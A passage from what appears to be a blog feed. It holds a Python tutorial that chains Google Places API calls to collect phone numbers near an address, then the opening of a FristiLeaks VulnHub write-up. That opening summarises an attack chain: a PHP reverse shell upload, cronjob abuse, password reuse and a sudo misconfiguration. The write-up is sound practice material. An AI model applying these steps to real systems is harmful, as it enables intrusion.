src=&quot;/assets/images/street2phone/street2phone3.png&quot; alt=&quot;Headerimg&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;notice--primary&quot;&gt;Only care about the source code? Checkout the &lt;a href=&quot;https://github.com/0xash/street2phone.py&quot;&gt;Github Repo&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;background--motivation&quot;&gt;Background &amp;amp; Motivation&lt;/h1&gt;

&lt;p&gt;One day a friend asked me something along the lines of:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“Do you think you could grab the local phone number area code from an address?”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A simple question. &lt;em&gt;“Yeah!”&lt;/em&gt; I answered. A quick Google search can get you that info. Just look around Google Maps and figure out which is most common.&lt;/p&gt;

&lt;p&gt;What if you have 100 addresses? What if you not only want the area code, but a list of phone numbers from that area? This would get extremely tedious.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enter the Places API.&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;places-api&quot;&gt;Places API&lt;/h1&gt;

&lt;p&gt;One of the first thoughts that entered my mind is that this could be automated with Python. A problem I foresaw is that finding an adequate data source would be difficult.&lt;/p&gt;

&lt;p&gt;So where would you go if you need to gather a large amount of geographical data? Google Maps seemed like a great candidate.&lt;/p&gt;

&lt;h4 id=&quot;a-quick-google-search-and-some-digging-later-we-find-the-places-api-specifically-the-place-details-request&quot;&gt;A quick &lt;em&gt;Google&lt;/em&gt; search and some digging later, we find the Places API, specifically the Place Details request:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/1.png&quot; alt=&quot;Place Details&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks spot on. So we can issue a Place Details request and gather information including the &lt;em&gt;phone number&lt;/em&gt;. Perfect.&lt;/p&gt;

&lt;p&gt;There’s one problem though, if we look at the above screenshot, to issue a Place Details request we will need a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; from a Place Search.&lt;/p&gt;

&lt;p&gt;If we remember our original question, we’ll need to gather phone numbers for &lt;em&gt;nearby&lt;/em&gt; locations, rather than the address itself (which may not possess a phone number entry within Google’s data).&lt;/p&gt;

&lt;h4 id=&quot;this-brings-us-to-the-nearby-search-request&quot;&gt;This brings us to the Nearby Search request:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/2.png&quot; alt=&quot;Nearby Search&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Essentially, we can gather a long list of nearby &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; parameters, then feed them into a Place Details search request to grab the phone number for each nearby location.&lt;/p&gt;

&lt;h4 id=&quot;lets-take-a-look-at-the-api-parameters-required-for-this-request&quot;&gt;Let’s take a look at the API parameters required for this request:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/3.png&quot; alt=&quot;Nearby Search Parameters&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;there-are-a-few-things-to-note-here&quot;&gt;There are a few things to note here:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;We’ll need to specify an output type in the URL. I’ll choose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; since I don’t care to mess around with XML.&lt;/li&gt;
  &lt;li&gt;If we look at the required parameters we can specify a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radius&lt;/code&gt; (in meters) to gather results from. This is cool because we can custom tailor the amount of results we want (or don’t want) to gather.&lt;/li&gt;
  &lt;li&gt;Lastly, apart from the usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; parameter, there is also a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location&lt;/code&gt; parameter that is required to issue the request. This must be served in the &lt;em&gt;longitude,latitude&lt;/em&gt; format. Crap, so one last hurdle. How do we get a latitude/longitude from an address?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Luckily, an additional API method exists for us to gather the latitude and longitude values we’ll need to issue a Nearby Search request for our address. This is a simple text search where we can use our original address as the arugment, therefore compelting the whole process.&lt;/p&gt;

&lt;h4 id=&quot;taking-a-look-at-the-text-search-request&quot;&gt;Taking a look at the Text Search Request:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/4.png&quot; alt=&quot;Text Search&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;now-lets-see-what-kind-of-output-this-will-return&quot;&gt;Now let’s see what kind of output this will return:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/5.png&quot; alt=&quot;Text Search Example Output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay, kind of confusing, but with all this information gathered, the flow for gathering phone numbers will look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/6.png&quot; alt=&quot;Automation Process Flow&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Essentially, we’ll take an address, translate that to latitude/longitude, find the nearby list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; parameters, and then &lt;em&gt;finally&lt;/em&gt; grab a list of phone numbers from those nearby places.&lt;/p&gt;

&lt;p&gt;You might be thinking that we can simply issue an original Place Details request from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; parameter that’s tied to our address, but this wouldn’t work since we want nearby phone numbers, and to grab the phone number of &lt;em&gt;nearby&lt;/em&gt; locations, we’ll need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; parameter for &lt;em&gt;all&lt;/em&gt; the nearby locations.&lt;/p&gt;

&lt;p&gt;It’s a little convuluded, but it’s the simplest way I could orchestrate it. If I’m missing a step that simplifies (and reduces the cost) of the whole process, Tell me!&lt;/p&gt;

&lt;h1 id=&quot;automating-the-process-with-python&quot;&gt;Automating the Process with Python&lt;/h1&gt;

&lt;p&gt;Now for the fun part; scripting this out and automating it.&lt;/p&gt;

&lt;p&gt;Let’s start with the fundamental stepping stone we’ll need to kick the process off; getting latitude and longitude. I’ll call this function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getLatLng&lt;/code&gt;:&lt;/p&gt;

&lt;h4 id=&quot;getlatlng&quot;&gt;getLatLng():&lt;/h4&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getLatLng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;latlongPayload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APIKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'query'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'fields'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lat,lng&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;longlat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://maps.googleapis.com/maps/api/place/textsearch/json?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;latlongPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;lat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;longlat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'results'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'geometry'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'location'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;lng&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;longlat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'results'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'geometry'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'location'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lng'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;## Catch errors
&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;UnboundLocalError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No lat long found&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For context, I’ve already setup a parser that is taking arguments that we can access via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;args.&amp;lt;value&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I’ll next use the Python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requests&lt;/code&gt; module to issue a Text Search request using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;latlongPayload&lt;/code&gt; array we’ve constructed. Note the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;field&lt;/code&gt; value in that array, which tells Google that we only care about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lat&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lng&lt;/code&gt; values.&lt;/p&gt;

&lt;p&gt;After some indicing we can simply return the latitude and longitude of this address, in a pre-composed format that the Nearby Search request will need in our next step.&lt;/p&gt;

&lt;p&gt;Lastly, I’ll throw in some error handling to catch errors that may occur if Google can’t find a lat/lng value for a given address.&lt;/p&gt;

&lt;p class=&quot;box-warning&quot;&gt;To issue a request to Google APIs you’ll need a &lt;em&gt;devloper key&lt;/em&gt;. For more information on how to get one check out &lt;a href=&quot;https://developers.google.com/maps/documentation/javascript/get-api-key&quot;&gt;this documentation&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;with-this-written-ill-go-ahead-and-give-the-getlatlng-method-a-try&quot;&gt;With this written, I’ll go ahead and give the getLatLng method a try:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/7.png&quot; alt=&quot;Running getLatLng&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nice! So we have a working Lat/Lng. Let’s move on to scripting the Nearby Search request.&lt;/p&gt;

&lt;h4 id=&quot;getplaceids&quot;&gt;getPlaceIDs():&lt;/h4&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getPlaceIDs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;nearbyPayload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APIKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'location'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getLatLng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'radius'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;nearbyReq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://maps.googleapis.com/maps/api/place/nearbysearch/json?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nearbyPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;nearbysearches&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nearbyReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'results'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;placeIDList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
   
   &lt;span class=&quot;c1&quot;&gt;## Iterate through JSON and add place_ids to list if not empty
&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nearbysearches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'place_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;placeIDList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'place_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;placeIDList&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;box-warning&quot;&gt;Nearby Search requests can quickly become expensive. If you’d like your search to return specific values (and cut down on prices), I would recommend checking out the &lt;a href=&quot;https://developers.google.com/places/web-service/search#FindPlaceRequests&quot;&gt;Find Place request documentation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can reuse our getLatLng method by simply including it within our passed along payload of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nearbyPayload&lt;/code&gt;. We’ll also set the radius to 150 for a decent amount of results.&lt;/p&gt;

&lt;p&gt;After our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nearbyPayload&lt;/code&gt; value is set, we can simply issue the Nearby Search request. Now we will indice to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;results&lt;/code&gt; portion of the JSON, and itereate through the data. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; value does not possess a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NoneType&lt;/code&gt; value, we will append it to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;placeIDList&lt;/code&gt; list that will be returned once the entire list of nearby locations has been iterated through.&lt;/p&gt;

&lt;h4 id=&quot;with-our-function-completed-lets-try-to-grab-a-list-of-place_id-parameters&quot;&gt;With our function completed, let’s try to grab a list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; parameters:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/8.png&quot; alt=&quot;Running getPlaceIDs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Awesome. This brings us to the final stretch, with our working list of nearby &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;place_id&lt;/code&gt; values, all we will need to do is issue a Place Details request for each and gather the phone number varaible.&lt;/p&gt;

&lt;p&gt;I’ll create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;makePhoneNumberList&lt;/code&gt; function to automate this final process.&lt;/p&gt;

&lt;h4 id=&quot;makephonenumberlist&quot;&gt;makePhoneNumberList():&lt;/h4&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makePhoneNumberList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;phoneNumsList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getPlaceIDs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;placeIDpayload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APIKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'place_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'fields'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;formatted_phone_number&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;phoneQuery&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://maps.googleapis.com/maps/api/place/details/json?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;placeIDpayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;phoneNumbs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phoneQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'result'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;phoneNumsList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phoneNumbs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formatted_phone_number&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
      
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phoneNumsList&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We begin by iterating through our list of Nearby Place IDs (gathered through use of our previous functions).&lt;/p&gt;

&lt;p&gt;Notice that we specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formatted_phone_number&lt;/code&gt; field as the only desired return value for the request.&lt;/p&gt;

&lt;p&gt;For each Place ID in our list, we issue a Place Details request and append the returned phone number to a list called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phoneNumsList&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;running-the-makephonenumberlist-function&quot;&gt;Running the makePhoneNumberList function:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/9.png&quot; alt=&quot;Running makePhoneNumberList&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A little clunky with the returned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NoneType&lt;/code&gt; values, but it gets the job done.&lt;/p&gt;

&lt;h2 id=&quot;the-final-product&quot;&gt;The Final Product.&lt;/h2&gt;

&lt;p&gt;With all of our functions in place, and some extra scripting to provide meaningful output, our final result looks like the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/street2phone/10.png&quot; alt=&quot;Running the final script&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;And that’s it. A lightweight (&lt;em&gt;and potentially costly&lt;/em&gt;) way to mass grab phone numbers from a single address. You can check out the full documentation from the &lt;a href=&quot;https://github.com/0xash/street2phone.py&quot;&gt;Github Repo&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;How useful is this? I have no idea. It was a great excuse to work on learning Python. Maybe you’ll find a cool use for the script, but hopefully at least it provides a decent guide on using some of the Google Places APIs.&lt;/p&gt;</content><author><name>Ash</name></author><category term="Projects" /><category term="Python" /><category term="API" /><category term="Google Maps" /><category term="Google Places" /><category term="Google APIs" /><category term="Automation" /><summary type="html">How I used Python and Google's Places API to farm phone numbers. Walk through my thought process of taking a problem, attacking it with Python and the (expensive) Google Places API to reach a workable solution.</summary></entry><entry><title type="html">FristiLeaks 1.3 Writeup - VulnHub</title><link href="http://localhost:4000/FristiLeaks-1.3/" rel="alternate" type="text/html" title="FristiLeaks 1.3 Writeup - VulnHub" /><published>2020-08-02T00:00:00-04:00</published><updated>2020-08-02T00:00:00-04:00</updated><id>http://localhost:4000/FristiLeaks-1.3</id><content type="html" xml:base="http://localhost:4000/FristiLeaks-1.3/">&lt;p&gt;FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It’s by far one of my favorite VulnHub boxes I’ve done, as it involves some fun &lt;em&gt;and&lt;/em&gt; simple reversing/code analysis.&lt;/p&gt;

&lt;p&gt;It also involves practice hopping around and enumerating a Linux environment from the perspective of multiple users, and requires some creative thinking.&lt;/p&gt;

&lt;p&gt;The challenge begins by using some simple guesswork to find a login portal. The source code of this login portal cotains an HTML comment that leaks a base64 encoded image.&lt;/p&gt;

&lt;p&gt;After decoding the image, we are able to gather the password used to login to web application. We exploit the web application’s upload functionality to upload a PHP reverse shell and get a reverse shell.&lt;/p&gt;

&lt;p&gt;Privilege escalation involves abusing a cronjob, reversing a simple python cryptography algorithm, reusing passwords, &lt;em&gt;and&lt;/em&gt; a sudo misconfiguration to finally gather root.&lt;/p&gt;

&lt;p class=&quot;notice--warning&quot;&gt;&lt;strong&gt;Note About Setup:&lt;/strong&gt; For the networking to properly work you’ll need to manually set the VMs MAC address to the following: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;08:00:27:A5:A6:76&lt;/code&gt; &lt;br /&gt;&lt;br /&gt;
